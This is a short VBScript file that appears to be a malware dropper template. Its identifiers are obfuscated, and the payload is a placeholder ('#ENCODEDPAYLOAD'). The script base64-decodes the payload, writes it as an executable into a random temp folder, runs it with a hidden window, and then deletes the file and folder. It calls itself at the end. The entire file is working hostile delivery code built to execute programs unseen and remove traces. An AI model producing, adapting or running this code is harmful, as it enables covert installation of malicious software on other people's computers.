Function QzmJtOmm(GWXgtsftxiYK)
	cOjipipIvNz = "<B64DECODE xmlns:dt="& Chr(34) & "urn:schemas-microsoft-com:datatypes" & Chr(34) & " " & _
		"dt:dt=" & Chr(34) & "bin.base64" & Chr(34) & ">" & _
		GWXgtsftxiYK & "</B64DECODE>"
	Set DbwPyFuPbEUuS = CreateObject("MSXML2.DOMDocument.3.0")
	DbwPyFuPbEUuS.LoadXML(cOjipipIvNz)
	QzmJtOmm = DbwPyFuPbEUuS.selectsinglenode("B64DECODE").nodeTypedValue
	set DbwPyFuPbEUuS = nothing
End Function

Function OzLswswIbyr()
	mkvdRRlb = "#ENCODEDPAYLOAD"
	Dim lMwSgSdvthtJh
	Set lMwSgSdvthtJh = CreateObject("Scripting.FileSystemObject")
	Dim fDTFDArXBnfXlV
	Dim HZxubQZcyF
	Set fDTFDArXBnfXlV = lMwSgSdvthtJh.GetSpecialFolder(2)
	HZxubQZcyF = fDTFDArXBnfXlV & "\" & lMwSgSdvthtJh.GetTempName()
	lMwSgSdvthtJh.CreateFolder(HZxubQZcyF)
	LPJTkeTAismPqT = HZxubQZcyF & "\" & "OgwfPvMArMnRHs.exe"
	Dim SJrvorTMYIZ
	Set SJrvorTMYIZ = CreateObject("Wscript.Shell")
	JHKMZRKTCPxQ = QzmJtOmm(mkvdRRlb)
	Set PSVULEhznibo = CreateObject("ADODB.Stream")
	PSVULEhznibo.Type = 1
	PSVULEhznibo.Open
	PSVULEhznibo.Write JHKMZRKTCPxQ
	PSVULEhznibo.SaveToFile LPJTkeTAismPqT, 2
	SJrvorTMYIZ.run LPJTkeTAismPqT, 0, true
	lMwSgSdvthtJh.DeleteFile(LPJTkeTAismPqT)
	lMwSgSdvthtJh.DeleteFolder(HZxubQZcyF)
End Function

OzLswswIbyr

